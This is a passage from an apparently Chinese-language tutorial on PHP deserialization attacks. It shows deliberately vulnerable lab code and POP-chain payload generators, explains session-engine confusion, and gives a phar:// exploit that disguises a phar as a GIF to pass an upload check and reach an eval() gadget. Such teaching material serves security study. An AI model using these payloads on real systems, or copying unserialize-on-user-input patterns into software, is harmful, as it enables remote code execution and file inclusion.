class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1 = <span class="keyword">new</span> <span class="title class_">Call</span>();　　<span class="comment">//把$mod1赋值为Call类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1 = <span class="keyword">new</span> <span class="title function_ invoke__">funct</span>();　　<span class="comment">//把 $mod1赋值为funct类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1= <span class="keyword">new</span> <span class="title function_ invoke__">func</span>();　　<span class="comment">//把 $mod1赋值为func类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1= <span class="keyword">new</span> <span class="title function_ invoke__">string1</span>();　　<span class="comment">//把 $mod1赋值为string1类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1= <span class="keyword">new</span> <span class="title class_">GetFlag</span>();　　<span class="comment">//把 $str1赋值为GetFlag类对象      </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> start_gg;　　<span class="comment">//构造start_gg类对象$b</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));　　<span class="comment">//显示输出url编码后的序列化对象</span></span><br></pre></td></tr></table></figure>
<h4 id="0x09"><a class="markdownIt-Anchor" href="#0x09">#</a> 0x09</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var = &quot;D://1.txt&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = new Show();</span><br><span class="line">$a-&gt;source = $a;</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="php_session-反序列化"><a class="markdownIt-Anchor" href="#php_session-反序列化">#</a> PHP_session 反序列化</h4>
<p>当第一次访问网站时，Seesion_start () 函数就会创建一个唯一的 Session ID，并自动通过 HTTP 的响应头，将这个 Session ID 保存到客户端 Cookie 中。同时，也在服务器端创建一个以 Session ID 命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过 HTTP 的请求头将 Cookie 中保存的 Seesion ID 再携带过来，这时 Session_start () 函数就不会再去分配一个新的 Session ID，而是在服务器的硬盘中去寻找和这个 Session ID 同名的 Session 文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
<p><strong>session_start 的作用</strong></p>
<p>当会话自动开始或者通过 session_start () 手动开始的时候， PHP 内部会依据客户端传来的 PHPSESSID 来获取现有的对应的会话数据（即 session 文件）， PHP 会自动反序列化 session 文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为 sess_PHPSESSID (客户端传来的) 的文件。如果客户端未发送 PHPSESSID，则创建一个由 32 个字母组成的 PHPSESSID，并返回 set-cookie。</p>
<p><strong>Session 存储机制</strong></p>
<p>PHP 中的 Session 中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以 sess_sessionid 来进行命名的，文件的内容就是 Session 值的序列化之后的内容。</p>
<p>先来大概了解一下 PHP Session 在 php.ini 中主要存在以下配置项：</p>
<p>在 PHP 中 Session 有三种序列化的方式，分别是 php，php_serialize，php_binary，不同的引擎所对应的 Session 的存储的方式不同</p>
<table>
<thead>
<tr>
<th><strong>存储引擎</strong></th>
<th><strong>存储方式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值</td>
</tr>
<tr>
<td>php</td>
<td>键名 + 竖线 + 经过 serialize () 函数序列处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>(PHP&gt;5.5.4) 经过 serialize () 函数序列化处理的数组</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:5:&quot;aaaaa&quot;;    //php</span><br><span class="line">usernames:5:&quot;bbbbb&quot;;    //php_binary,最前面为ASCII中的不可见字符</span><br><span class="line">a:1:&#123;s:8:&quot;username&quot;;s:5:&quot;bbbbb&quot;;&#125;    //php_serialize</span><br></pre></td></tr></table></figure>
<p><strong>Session 反序列化漏洞</strong></p>
<p>PHP 在 session 存储和读取时，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，PHP 中的 Session 的实现是没有的问题的，<strong>漏洞主要是由于使用不同的引擎来处理 session 文件造成的</strong>。</p>
<p>存在对 $_SESSION 变量赋值</p>
<p>漏洞的主要原因在于不同的引擎对于竖杠’ | ' 的解析产生歧义。</p>
<p>对于 php_serialize 引擎来说’ | ‘可能只是一个正常的字符；但对于 php 引擎来说’ | ‘就是分隔符，前面是 $_SESSION [‘username’] 的键名 ，后面是 GET 参数经过 serialize 序列化后的值。从而在解析的时候造成了歧义，导致其在解析 Session 文件时直接对’ | ' 后的值进行反序列化处理。</p>
<h4 id="phar伪协议触发php反序列化"><a class="markdownIt-Anchor" href="#phar伪协议触发php反序列化">#</a> phar 伪协议触发 php 反序列化</h4>
<p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize ()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的 Black Hat 上提出利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。</p>
<p><strong>phar 介绍和漏洞原理</strong></p>
<p>phar 就是 php 压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与 file://，php:// 等类似，也是一种流包装器。</p>
<p><strong>phar 文件有四部分构成</strong>：</p>
<p><strong>1. a stub</strong></p>
<p>识别 phar 拓展的标识，格式为：xxx<?php xxx; __HALT_COMPILER();?>，对应的函数 Phar::setStub。前期内容不限，但必须以 __HALT_COMPILER ();?&gt; 结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</p>
<p><strong>2. a manifest describing the contents</strong></p>
<p>phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是漏洞利用的核心部分。对应函数 Phar::setMetadata— 设置 phar 归档元数据。</p>
<p><strong>3. the file contents</strong></p>
<p>被压缩文件的内容。</p>
<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong></p>
<p>签名，放在文件末尾。对应函数 Phar :: stopBuffering— 停止缓冲对 Phar 存档的写入请求，并将更改保存到磁盘。</p>
<p><strong>这里有两个关键点：</strong></p>
<ol>
<li>
<p><strong>文件标识</strong>，必须以 __HALT_COMPILER ();?&gt; 结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者 pdf 文件来绕过一些上传限制</p>
</li>
<li>
<p><strong>反序列化</strong>，phar 存储的 meta-data 信息以序列化方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件时，文件内容会被解析成 phar 对象，然后 phar 对象内的 meta-data 会被反序列化。</p>
</li>
</ol>
<p>meta-data 是用 serialize () 生成并保存在 phar 文件中，当内核调用 phar_parse_metadata () 解析 meta-data 数据时，会调用 php_var_unserialize () 对其进行反序列化操作，因此会造成反序列化漏洞。</p>
<p>而在一些上传点，我们可以更改 phar 的文件头并且修改其后缀名绕过检测，如：test.gif，里面的 meta-data 却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过 + 执行的方法。</p>
<p>生成 phar 文件的代码如下：</p>
<p>phar.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //反序列化payload构造</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line"></span><br><span class="line">    //实例一个phar对象供后续操作，后缀名必须为phar</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    //开始缓冲对phar的写操作 </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    </span><br><span class="line">    //设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class="line"></span><br><span class="line">    //将反序列化的对象放入该文件中</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o-&gt;data=&#x27;i am bmjoker&#x27;;</span><br><span class="line">    //将自定义的归档元数据meta-data存入manifest</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line"></span><br><span class="line">    //phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;bmjoker&quot;); </span><br><span class="line">    //停止缓冲对phar的写操作</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以明显的看到 meta-data 是以序列化的形式存储的，有序列化数据必然会有反序列化操作，php 一大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th><em><strong>* 受影响的文件操作函数列表 *</strong></em></th>
<th>** **</th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
<td>touch</td>
<td>get_meta_tags</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
<td>hash_file</td>
<td>get_headers</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
<td>md5_file</td>
<td>getimagesize</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
<td>sha1_file</td>
<td>getimagesizefromstring</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
<td>hash_update_file</td>
<td>imageloadfont</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
<td>hash_hmac_file</td>
<td>exif_imagetype</td>
</tr>
</tbody>
</table>
<p>这些函数里面可以使用 phar 协议，当然还有常用的文件包含的几个函数 include、include_once、requrie、require_once</p>
<p>对刚才生成的 phar 使用文件操作函数实现反序列化读取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject&#123;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename =  &quot;phar://phar.phar/test.txt&quot;;</span><br><span class="line">    file_get_contents($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="0x10"><a class="markdownIt-Anchor" href="#0x10">#</a> 0x10</h4>
<p>upload_file.php：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">        echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>upload_file.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://127.0.0.1/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>file_un.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);   // 漏洞点</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>upload_file.php 对上传文件的类型，后缀进行了判断，限制为 GIF 文件。而 file_un.php 文件主要使用 file_exists () 判断文件是否存在，并且存在魔术方法__destruct ()。大概思路为首先根据 file_un.php 写一个生成 phar 的 php 文件，当然需要绕过为 gif 的限制，所以需要加 GIF89a，然后我们访问这个 php 文件后，生成了 phar.phar，修改后缀为 gif，上传到服务器，然后利用 file_exists，使用 phar:// 执行代码。</p>
<p>构造 payload 代码 eval.php：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$object = new AnyClass();</span><br><span class="line">$object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>访问 eval.php，会在当前目录生成 phar.phar，然后修改后缀 gif</p>
<p><strong>漏洞利用条件</strong></p>
<p>\1. phar 文件要能够上传到服务器端（如 GET、POST），并且要有 file_exists ()，fopen ()，file_get_contents ()，include () 等文件操作的函数</p>
<p>\2. 要有可用的魔术方法作为 &quot;跳板&quot;；</p>
<p>\3. 文件操作函数的参数可控，且：，/，phar 等特殊字符没有被过滤。</p>
